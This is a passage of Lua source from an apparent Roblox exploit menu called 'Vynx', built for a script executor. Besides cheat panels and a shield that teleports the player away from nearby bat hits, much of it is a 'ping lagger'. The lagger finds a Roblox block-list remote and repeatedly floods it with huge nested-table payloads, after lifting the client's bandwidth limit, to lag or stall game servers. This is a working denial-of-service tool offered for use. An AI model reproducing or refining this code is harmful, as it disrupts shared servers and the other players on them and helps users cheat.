    local bg = UI_BG_DARK or Color3.fromRGB(0, 0, 0)
    local white = Color3.fromRGB(255, 255, 255)
    local black = Color3.fromRGB(0, 0, 0)
    local dim = UI_TEXT_DIM or Color3.fromRGB(180, 180, 190)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxAntiAntiTP"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 12
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local ok = false
    if gethui then ok = pcall(function() gui.Parent = gethui() end) end
    if not ok then
        ok = pcall(function()
            if syn and syn.protect_gui then syn.protect_gui(gui) end
            gui.Parent = game:GetService("CoreGui")
        end)
    end
    if not ok then gui.Parent = player:WaitForChild("PlayerGui") end
    M.antiDesyncGui = gui

    
    local pill = Instance.new("Frame")
    pill.Name = "AntiDesyncPill"
    pill.Visible = false
    pill.Active = true
    pill.ZIndex = 40
    pill.AnchorPoint = Vector2.new(0.5, 0)
    pill.Position = UDim2.new(0.5, 0, 0, 52)
    pill.Size = UDim2.new(0, 170, 0, 32)
    pill.BackgroundColor3 = bg
    pill.BackgroundTransparency = 0.05
    pill.BorderSizePixel = 0
    pill.Parent = gui
    Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 12)
    local pillStroke = Instance.new("UIStroke", pill)
    pillStroke.Color = accent
    pillStroke.Thickness = 1.2
    pillStroke.Transparency = 0.4
    local pillLbl = Instance.new("TextLabel", pill)
    pillLbl.Size = UDim2.new(1, 0, 1, 0)
    pillLbl.BackgroundTransparency = 1
    pillLbl.Text = "VYNX ANTI ANTI TP"
    pillLbl.TextColor3 = accent
    pillLbl.TextSize = 11
    pillLbl.Font = Enum.Font.GothamBlack
    local pillBtn = Instance.new("TextButton", pill)
    pillBtn.Size = UDim2.new(1, 0, 1, 0)
    pillBtn.BackgroundTransparency = 1
    pillBtn.Text = ""
    pillBtn.ZIndex = 41
    M.antiDesyncPill = pill

    local main = Instance.new("Frame", gui)
    main.Name = "Main"
    main.Size = UDim2.new(0, 210, 0, 195)
    main.Position = UDim2.new(0.5, -105, 0.35, 0)
    main.BackgroundColor3 = bg
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.antiDesyncPanelOpen == true
    local adCorner = Instance.new("UICorner", main)
    adCorner.Name = "MainCorner"
    adCorner.CornerRadius = UDim.new(0, M.MENU_CORNER_R or 16)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Name = "MainStroke"
    mainStroke.Color = accent
    mainStroke.Thickness = 1
    M.antiDesyncMain = main

    
    pcall(function() M.applyCustomBackground(main) end)

    
    local header = Instance.new("Frame", main)
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 35)
    header.BackgroundTransparency = 1
    header.ZIndex = 5

    local titleLbl = Instance.new("TextLabel", header)
    titleLbl.Name = "Title"
    titleLbl.Size = UDim2.new(1, -30, 1, 0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "VYNX ANTI ANTI TP"
    titleLbl.TextColor3 = accent
    titleLbl.Font = Enum.Font.GothamBlack
    titleLbl.TextSize = 10
    titleLbl.TextXAlignment = Enum.TextXAlignment.Center
    titleLbl.ZIndex = 6

    local minimizeBtn = Instance.new("TextButton", main)
    minimizeBtn.Size = UDim2.new(0, 22, 0, 22)
    minimizeBtn.Position = UDim2.new(1, -28, 0, 6)
    minimizeBtn.BackgroundColor3 = UI_BTN_BG or black
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.Text = "-"
    minimizeBtn.TextColor3 = white
    minimizeBtn.Font = Enum.Font.GothamBlack
    minimizeBtn.TextSize = 14
    minimizeBtn.ZIndex = 10
    Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(1, 0)

    local closeBtn = Instance.new("TextButton", main)
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -54, 0, 6)
    closeBtn.BackgroundColor3 = UI_BTN_BG or black
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "X"
    closeBtn.TextColor3 = white
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 11
    closeBtn.ZIndex = 10
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

    local content = Instance.new("Frame", main)
    content.Name = "Content"
    content.Size = UDim2.new(1, -16, 1, -45)
    content.Position = UDim2.new(0, 8, 0, 40)
    content.BackgroundTransparency = 1
    content.ZIndex = 2

    local function makeToggleRow(y, label, getState, setState)
        local row = Instance.new("Frame", content)
        row.Size = UDim2.new(1, 0, 0, 28)
        row.Position = UDim2.new(0, 0, 0, y)
        row.BackgroundTransparency = 1
        row.ZIndex = 3
        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(1, -8, 1, -4)
        btn.Position = UDim2.new(0, 4, 0, 2)
        btn.BackgroundColor3 = white
        btn.BackgroundTransparency = 0.5
        btn.BorderSizePixel = 0
        btn.Text = label .. ": " .. (getState() and "ON" or "OFF")
        btn.TextColor3 = black
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.ZIndex = 12
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
        local st = Instance.new("UIStroke", btn)
        st.Color = accent
        st.Thickness = 1
        local function refresh()
            local on = getState()
            btn.Text = label .. ": " .. (on and "ON" or "OFF")
            TweenService:Create(btn, TweenInfo.new(0.2), {
                BackgroundColor3 = on and accent or white
            }):Play()
            btn.TextColor3 = on and white or black
            st.Color = accent
        end
        btn.MouseButton1Click:Connect(function()
            setState(not getState())
            refresh()
            saveCherryConfig()
        end)
        refresh()
        return refresh
    end

    makeToggleRow(4, "ANTI DESYNC", function() return M.antiDesyncShield end, function(v) M.antiDesyncShield = v end)

    local lockBtn = Instance.new("TextButton", content)
    lockBtn.Size = UDim2.new(1, -8, 0, 22)
    lockBtn.Position = UDim2.new(0, 4, 0, 36)
    lockBtn.BackgroundColor3 = white
    lockBtn.BackgroundTransparency = 0.5
    lockBtn.BorderSizePixel = 0
    lockBtn.Text = M.antiDesyncUiLocked and "Unlock UI" or "Lock UI Dragging"
    lockBtn.TextColor3 = black
    lockBtn.Font = Enum.Font.GothamBold
    lockBtn.TextSize = 9
    lockBtn.ZIndex = 12
    Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 4)
    local lockSt = Instance.new("UIStroke", lockBtn)
    lockSt.Color = accent
    lockSt.Thickness = 1
    lockBtn.MouseButton1Click:Connect(function()
        M.antiDesyncUiLocked = not M.antiDesyncUiLocked
        lockBtn.Text = M.antiDesyncUiLocked and "Unlock UI" or "Lock UI Dragging"
        lockBtn.TextColor3 = M.antiDesyncUiLocked and accent or black
        saveCherryConfig()
    end)

    local info = Instance.new("TextLabel", content)
    info.Size = UDim2.new(1, -8, 0, 48)
    info.Position = UDim2.new(0, 4, 0, 66)
    info.BackgroundColor3 = black
    info.BackgroundTransparency = 0.55
    info.BorderSizePixel = 0
    info.Text = "Shield dodges bat hits nearby."
    info.TextColor3 = white
    info.Font = Enum.Font.GothamMedium
    info.TextSize = 9
    info.TextWrapped = true
    info.ZIndex = 3
    Instance.new("UICorner", info).CornerRadius = UDim.new(0, 4)

    
    do
        local dragging, dragStart, mainStart, dragInput
        main.InputBegan:Connect(function(inp)
            if M.antiDesyncUiLocked then return end
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = inp.Position
                mainStart = main.Position
                inp.Changed:Connect(function()
                    if inp.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        main.InputChanged:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
                dragInput = inp
            end
        end)
        UIS.InputChanged:Connect(function(inp)
            if inp == dragInput and dragging and dragStart and mainStart then
                local dx = inp.Position.X - dragStart.X
                local dy = inp.Position.Y - dragStart.Y
                main.Position = UDim2.new(mainStart.X.Scale, mainStart.X.Offset + dx, mainStart.Y.Scale, mainStart.Y.Offset + dy)
            end
        end)
    end

    local function setOpen(open)
        M.antiDesyncPanelOpen = open
        M.antiDesyncMinimized = false
        main.Visible = open
        content.Visible = true
        main.Size = UDim2.new(0, 210, 0, 195)
        
        pill.Visible = false
        saveCherryConfig()
    end

    minimizeBtn.MouseButton1Click:Connect(function()
        M.antiDesyncMinimized = not M.antiDesyncMinimized
        if M.antiDesyncMinimized then
            content.Visible = false
            TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 210, 0, 35)
            }):Play()
        else
            TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 210, 0, 195)
            }):Play()
            task.delay(0.12, function() if content then content.Visible = true end end)
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        setOpen(false)
    end)
    pillBtn.MouseButton1Click:Connect(function()
        setOpen(true)
    end)

    
    if M.antiDesyncConn then pcall(function() M.antiDesyncConn:Disconnect() end) end
    local _dsAcc = 0
    M.antiDesyncConn = RunService.Heartbeat:Connect(function(dt)
        if not M.antiDesyncShield then return end
        _dsAcc = _dsAcc + (dt or 0.016)
        if _dsAcc < 0.05 then return end
        _dsAcc = 0
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end
        if M.antiDesyncShield then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local eHrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    local tool = plr.Character:FindFirstChildWhichIsA("Tool")
                    if eHrp and tool then
                        local n = tool.Name:lower()
                        if n:find("bat", 1, true) or n:find("slap", 1, true) then
                            local dist = (hrp.Position - eHrp.Position).Magnitude
                            if dist < 6 and dist > 0.5 then
                                local away = Vector3.new(hrp.Position.X - eHrp.Position.X, 0, hrp.Position.Z - eHrp.Position.Z)
                                if away.Magnitude > 0.1 then
                                    away = away.Unit * 1.2
                                    local pos = hrp.Position + away
                                    hrp.CFrame = CFrame.new(pos.X, hrp.Position.Y, pos.Z) * (hrp.CFrame - hrp.CFrame.Position)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)

    
    main.Visible = M.antiDesyncPanelOpen == true
    pill.Visible = false
end

function M.setAntiDesyncPanelOpen(on)
    M.antiDesyncPanelOpen = on and true or false
    if not M.antiDesyncGui then
        M.buildAntiDesyncUI()
    end
    if M.antiDesyncMain then
        M.antiDesyncMain.Visible = M.antiDesyncPanelOpen
        if M.antiDesyncMain:FindFirstChild("Content") then
            M.antiDesyncMain.Content.Visible = true
        end
        M.antiDesyncMain.Size = UDim2.new(0, 210, 0, 195)
    end
    
    if M.antiDesyncPill then
        M.antiDesyncPill.Visible = false
    end
    M.applyAntiDesyncTheme()
    saveCherryConfig()
end




function M.ensureMusicSound()
    
    if M.musicSound and M.musicSound.Parent then
        return M.musicSound
    end
    local parent = M.musicGui
    if not parent then
        parent = player:FindFirstChild("PlayerGui") or game:GetService("SoundService")
    end
    local snd = Instance.new("Sound")
    snd.Name = "VynxMusicPlayer"
    snd.Volume = math.clamp(tonumber(M.musicVolume) or 0.8, 0, 1)
    snd.Looped = true
    snd.PlaybackSpeed = 1
    snd.RollOffMode = Enum.RollOffMode.Linear
    snd.Parent = parent
    M.musicSound = snd
    return snd
end

function M.stopMusic()
    local snd = M.musicSound
    if not snd then return end
    pcall(function()
        snd:Stop()
        snd.TimePosition = 0
    end)
    M.musicWasPlaying = false
    pcall(saveCherryConfig)
end

function M.playMusicTrack(track)
    if not track or not track.id then return end
    local snd = M.ensureMusicSound()
    local asset = "rbxassetid://" .. tostring(track.id)
    
    if snd.SoundId ~= asset then
        pcall(function() snd:Stop() end)
        snd.SoundId = asset
    end
    snd.Looped = true
    snd.Volume = math.clamp(tonumber(M.musicVolume) or 0.8, 0, 1)
    M.musicLastTrackId = tonumber(track.id) or track.id
    M.musicWasPlaying = true
    pcall(function()
        snd:Play()
    end)
    pcall(saveCherryConfig)
end

function M.destroyMusicUI()
    
    if M.musicSound then
        pcall(function()
            M.musicSound:Stop()
        end)
    end
    if M.musicGui then
        pcall(function() M.musicGui:Destroy() end)
    end
    M.musicSound = nil
    M.musicGui = nil
    M.musicMain = nil
    M.musicPill = nil
end





local function vynxPingResolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function vynxPingIsGamepad(kc)
    if not kc then return false end
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

function M.findPingRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            remote = r; break
        end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
                remote = c; break
            end
        end
    end
    return remote
end


function M.buildPingPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor((tonumber(power) or 100000) / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

function M.runPingLoop()
    if M.pingLoopRunning then return end
    M.pingLoopRunning = true
    local delay = tonumber(M.pingInterval) or 0.125
    while M.pingActive and M.pingPanelOpen and M.pingRemote do
        local payload = M.buildPingPayload(M.pingPower)
        local ok = pcall(function()
            if M.pingRemote:IsA("RemoteFunction") then
                M.pingRemote:InvokeServer(payload)
            else
                M.pingRemote:FireServer(payload)
            end
        end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
    M.pingLoopRunning = false
end

function M.setPingActive(state, isManual)
    
    if state and not M.pingPanelOpen then
        M.pingActive = false
        if M._pingRefreshVisual then pcall(M._pingRefreshVisual) end
        return
    end
    M.pingActive = state and true or false
    if isManual then
        if M.pingBrainrotMode then
            M.pingManualOverride = not state
        else
            M.pingManualOverride = false
        end
    end
    if M.pingActive then
        if not M.pingRemote then
            M.pingRemote = M.findPingRemote()
            if not M.pingRemote then
                M.pingActive = false
            end
        end
        if M.pingActive and not M.pingLoopRunning then
            task.spawn(M.runPingLoop)
        end
    end
    if M._pingRefreshVisual then
        pcall(M._pingRefreshVisual)
    end
end


function M.vynxLaggerBombBless(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for _ = 1, 25 do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local max = math.min(12000, math.max(1, tonumber(poder) or 25) * 50)
    for _ = 1, max do table.insert(main, spam) end
    local remote = M.vynxLaggerRemote or M.findPingRemote()
    M.vynxLaggerRemote = remote
    if not remote then return end
    pcall(function()
        if remote:IsA("RemoteFunction") then remote:InvokeServer(main)
        else remote:FireServer(main) end
    end)
end

function M.vynxLaggerBombHook(tableIncrease, tries)
    tableIncrease = math.max(10, tonumber(tableIncrease) or 265)
    tries = math.max(1, tonumber(tries) or 1)
    local maximum = math.floor(499999 / (tableIncrease + 2))
    if maximum < 1 then maximum = 1 end
    local maintable, spammedtable = {}, {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableIncrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = M.vynxLaggerRemote or M.findPingRemote()
    M.vynxLaggerRemote = remote
    if not remote then return end
    for _ = 1, tries do
        pcall(function()
            if remote:IsA("RemoteFunction") then remote:InvokeServer(maintable)
            else remote:FireServer(maintable) end
        end)
    end
end

function M.runVynxLaggerLoop()
    if M.vynxLaggerLoopRunning then return end
    M.vynxLaggerLoopRunning = true
    local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
    while M.vynxLaggerActive and M.vynxLaggerPanelOpen do
        pcall(function()
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        end)
        local lvl = M.vynxLaggerLevel or "Mid"
        local cfg = (M.VYNX_LAGGER_LEVELS and M.VYNX_LAGGER_LEVELS[lvl]) or M.VYNX_LAGGER_LEVELS.Mid
        if cfg.mode == "hook" then
            local ti = isMobile and (cfg.tableIncreaseMobile or 290) or (cfg.tableIncrease or 265)
            local waitT = isMobile and (cfg.waitMobile or 0.85) or (cfg.wait or 0.05)
            task.spawn(function() M.vynxLaggerBombHook(ti, cfg.tries or 1) end)
            task.wait(math.max(waitT, 0.05))
        else
            M.vynxLaggerBombBless(cfg.poder or 25)
            task.wait(math.max(cfg.wait or 0.18, 0.05))
        end
    end
    M.vynxLaggerLoopRunning = false
end

function M.setVynxLaggerActive(state)
    
    if state and not M.vynxLaggerPanelOpen then
        M.vynxLaggerActive = false
        if M._vynxLaggerRefreshVisual then pcall(M._vynxLaggerRefreshVisual) end
        return
    end
    M.vynxLaggerActive = state and true or false
    if M.vynxLaggerActive then
        if not M.vynxLaggerRemote then
            M.vynxLaggerRemote = M.findPingRemote()
        end
        if not M.vynxLaggerLoopRunning then
            task.spawn(M.runVynxLaggerLoop)
        end
    end
    if M._vynxLaggerRefreshVisual then
        pcall(M._vynxLaggerRefreshVisual)
    end
end

function M.buildPingLaggerUI()
    if M.pingGui and M.pingGui.Parent then
        pcall(function() M.pingGui:Destroy() end)
    end
    M.pingGui = nil
    M.pingMain = nil

    
    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(165, 75, 255)
    local accentDim = UI_ACCENT_DIM or accent:Lerp(Color3.new(0,0,0), 0.35)
    local PINK   = accent
    local PINK2  = accent:Lerp(Color3.fromRGB(255,255,255), 0.25)
    local PURPLE = accent
    local PURPLE2= accentDim
    local WHITE  = Color3.fromRGB(255, 255, 255)
    local BG     = themeDarkFromAccent and themeDarkFromAccent(accent, 0.12) or Color3.fromRGB(18, 10, 28)
    local CARD   = themeDarkFromAccent and themeDarkFromAccent(accent, 0.20) or Color3.fromRGB(28, 16, 42)
    local DIM    = accentDim:Lerp(Color3.fromRGB(200,200,210), 0.45)
    local GREEN  = Color3.fromRGB(120, 255, 170)
    local RED    = Color3.fromRGB(255, 110, 130)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxPingLaggerGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 18
    gui.IgnoreGuiInset = true
    local okParent = false
    if gethui then okParent = pcall(function() gui.Parent = gethui() end) end
    if not okParent then
        pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end)
    end
    M.pingGui = gui

    local MAIN_W, MAIN_H = 220, 92
    local main = Instance.new("Frame")
    main.Name = "VynxPingMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = UDim2.new(0.5, -MAIN_W/2, 0.22, 0)
    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    main.BackgroundTransparency = 0.45
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.pingPanelOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = WHITE
    mainStroke.Thickness = 1.4
    mainStroke.Transparency = 0.35
    M.pingMain = main
    pcall(function()
        if M.applyPingBackgrounds then
            M.applyPingBackgrounds()
        elseif M.applyCustomBackground then
            M.applyCustomBackground(main)
        end
    end)

    
    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.uiLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.uiLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    
    local header = Instance.new("Frame", main)
    header.Size = UDim2.new(1, 0, 0, 34)
    header.BackgroundTransparency = 1
    header.BorderSizePixel = 0
    header.ZIndex = 2

    local title = Instance.new("TextLabel", header)
    title.Size = UDim2.new(1, -90, 1, 0)
    title.Position = UDim2.new(0, 12, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "VYNX PING"
    title.TextColor3 = WHITE
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 13
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 0.35
    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    title.ZIndex = 3

    local statusPill = Instance.new("Frame", header)
    statusPill.Size = UDim2.new(0, 42, 0, 18)
    statusPill.Position = UDim2.new(1, -86, 0.5, -9)
    statusPill.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    statusPill.BorderSizePixel = 0
    statusPill.ZIndex = 3
    Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
    local statusLbl = Instance.new("TextLabel", statusPill)
    statusLbl.Size = UDim2.new(1, 0, 1, 0)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = M.pingActive and "ON" or "OFF"
    statusLbl.TextColor3 = M.pingActive and GREEN or RED
    statusLbl.Font = Enum.Font.GothamBlack
    statusLbl.TextSize = 9
    statusLbl.ZIndex = 4

    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 26, 0, 26)
    closeBtn.Position = UDim2.new(1, -30, 0.5, -13)
    closeBtn.BackgroundColor3 = Color3.fromRGB(50, 18, 40)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "X"
    closeBtn.TextColor3 = WHITE
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 12
    closeBtn.ZIndex = 4
    closeBtn.AutoButtonColor = false
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 7)
    closeBtn.MouseButton1Click:Connect(function()
        M.setPingPanelOpen(false)
    end)

    local activateBtn = Instance.new("TextButton", main)
    activateBtn.Size = UDim2.new(1, -16, 0, 32)
    activateBtn.Position = UDim2.new(0, 8, 0, 46)
    activateBtn.BackgroundColor3 = CARD
    activateBtn.BorderSizePixel = 0
    activateBtn.Text = ""
    activateBtn.AutoButtonColor = false
    activateBtn.ZIndex = 3
    Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(0, 9)
    local ag = Instance.new("UIGradient", activateBtn)
    ag.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, PURPLE2),
        ColorSequenceKeypoint.new(1, PURPLE),
    })
    ag.Rotation = 120
    local aStroke = Instance.new("UIStroke", activateBtn)
    aStroke.Color = WHITE
    aStroke.Thickness = 1.2
    aStroke.Transparency = M.pingActive and 0.15 or 0.45
    local activateLbl = Instance.new("TextLabel", activateBtn)
    activateLbl.Size = UDim2.new(1, 0, 1, 0)
    activateLbl.BackgroundTransparency = 1
    activateLbl.Text = M.pingActive and "ACTIVATED" or "ACTIVATE"
    activateLbl.TextColor3 = WHITE
    activateLbl.Font = Enum.Font.GothamBlack
    activateLbl.TextSize = 12
    activateLbl.ZIndex = 5

    activateBtn.MouseButton1Click:Connect(function()
        M.setPingActive(not M.pingActive, true)
    end)

    function M._pingRefreshVisual()
        if not (statusLbl and statusLbl.Parent) then return end
        statusLbl.Text = M.pingActive and "ON" or "OFF"
        statusLbl.TextColor3 = M.pingActive and GREEN or RED
        statusPill.BackgroundColor3 = M.pingActive and Color3.fromRGB(20, 50, 35) or Color3.fromRGB(50, 20, 40)
        activateLbl.Text = M.pingActive and "ACTIVATED" or "ACTIVATE"
        aStroke.Transparency = M.pingActive and 0.1 or 0.45
        mainStroke.Color = M.pingActive and GREEN or WHITE
        if M.pingActive then
            ag.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, PURPLE:Lerp(Color3.new(1,1,1), 0.25)),
                ColorSequenceKeypoint.new(1, PURPLE),
            })
        else
            ag.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, PURPLE2),
                ColorSequenceKeypoint.new(1, PURPLE),
            })
        end
    end
    M._pingRefreshVisual()

    
    local SET_W, SET_H = 230, 300
    local settingsFrame = Instance.new("Frame")
    settingsFrame.Name = "VynxPingSettings"
    settingsFrame.Size = UDim2.new(0, SET_W, 0, SET_H)
    settingsFrame.Position = UDim2.new(0.5, -SET_W/2, 0.22, MAIN_H + 12)
    settingsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    settingsFrame.BackgroundTransparency = 0.45
    settingsFrame.BorderSizePixel = 0
    settingsFrame.Visible = false
    settingsFrame.Active = true
    settingsFrame.ClipsDescendants = true
    settingsFrame.ZIndex = 20
    settingsFrame.Parent = gui
    Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 12)
    local ss = Instance.new("UIStroke", settingsFrame)
    ss.Color = WHITE
    ss.Thickness = 1.3
    ss.Transparency = 0.35
    M.pingSettings = settingsFrame
    pcall(function()
        if M.applyPingBackgrounds then M.applyPingBackgrounds() end
    end)

    do
        local dragging, dragStart, startPos
        settingsFrame.InputBegan:Connect(function(i)
            if M.uiLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = settingsFrame.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                settingsFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local setHeader = Instance.new("Frame", settingsFrame)
    setHeader.Size = UDim2.new(1, 0, 0, 32)
    setHeader.BackgroundTransparency = 1
    setHeader.BorderSizePixel = 0
    setHeader.ZIndex = 21
    local setTitle = Instance.new("TextLabel", setHeader)
    setTitle.Size = UDim2.new(1, -40, 1, 0)
    setTitle.Position = UDim2.new(0, 12, 0, 0)
    setTitle.BackgroundTransparency = 1
    setTitle.Text = "VYNX PING SETTINGS"
    setTitle.TextColor3 = WHITE
    setTitle.Font = Enum.Font.GothamBlack
    setTitle.TextSize = 11
    setTitle.TextXAlignment = Enum.TextXAlignment.Left
    setTitle.TextStrokeTransparency = 0.35
    setTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    setTitle.ZIndex = 22
    local setClose = Instance.new("TextButton", setHeader)
    setClose.Size = UDim2.new(0, 24, 0, 24)
    setClose.Position = UDim2.new(1, -28, 0.5, -12)
    setClose.BackgroundColor3 = Color3.fromRGB(50, 18, 40)
    setClose.Text = "X"
    setClose.TextColor3 = WHITE
    setClose.Font = Enum.Font.GothamBlack
    setClose.TextSize = 11
    setClose.ZIndex = 23
    setClose.BorderSizePixel = 0
    Instance.new("UICorner", setClose).CornerRadius = UDim.new(0, 6)
    setClose.MouseButton1Click:Connect(function()
        settingsFrame.Visible = false
    end)

    local function mkRow(y, label, valueText)
        local row = Instance.new("Frame", settingsFrame)
        row.Size = UDim2.new(1, -16, 0, 34)
        row.Position = UDim2.new(0, 8, 0, y)
        row.BackgroundColor3 = CARD
        row.BorderSizePixel = 0
        row.ZIndex = 21
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.48, 0, 1, 0)
        lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = WHITE
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 22
        local box = Instance.new("TextBox", row)
        box.Size = UDim2.new(0, 70, 0, 24)
        box.Position = UDim2.new(1, -78, 0.5, -12)
        box.BackgroundColor3 = Color3.fromRGB(20, 10, 32)
        box.BorderSizePixel = 0
        box.Text = valueText
        box.TextColor3 = PINK2
        box.Font = Enum.Font.GothamBold
        box.TextSize = 11
        box.ClearTextOnFocus = false
        box.ZIndex = 23
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
        return box
    end

    local powerBox = mkRow(42, "Power", tostring(M.pingPower))
    powerBox.FocusLost:Connect(function()
        local n = tonumber(powerBox.Text)
        if n then M.pingPower = math.max(1, n); powerBox.Text = tostring(M.pingPower); pcall(saveCherryConfig) end
    end)
    local intervalBox = mkRow(82, "Delay (s)", tostring(M.pingInterval))
    intervalBox.FocusLost:Connect(function()
        local n = tonumber(intervalBox.Text)
        if n then M.pingInterval = math.max(0.01, n); intervalBox.Text = tostring(M.pingInterval); pcall(saveCherryConfig) end
    end)

    
    local brRow = Instance.new("Frame", settingsFrame)
    brRow.Size = UDim2.new(1, -16, 0, 34)
    brRow.Position = UDim2.new(0, 8, 0, 122)
